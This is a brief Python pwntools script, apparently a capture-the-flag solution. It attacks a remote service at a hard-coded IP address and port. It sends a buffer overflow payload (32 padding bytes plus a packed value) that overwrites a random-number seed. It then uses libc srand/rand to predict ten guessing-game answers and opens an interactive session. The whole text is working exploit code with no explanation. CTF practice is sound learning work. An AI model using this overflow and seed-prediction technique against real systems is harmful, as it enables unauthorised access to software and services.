from pwn import *
from ctypes import cdll

libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")

context.log_level = 'DEBUG'

# p = process('../file/b59204f56a0545e8a22f8518e749f19f')
p = remote('61.147.171.105', '57992')
payload = b'a' * 32 + p64(1)

p.sendlineafter(b'name:', payload)
libc.srand(1)
for i in range(10):
    p.sendlineafter(b'number:', str(libc.rand() % 6 + 1).encode())

p.interactive()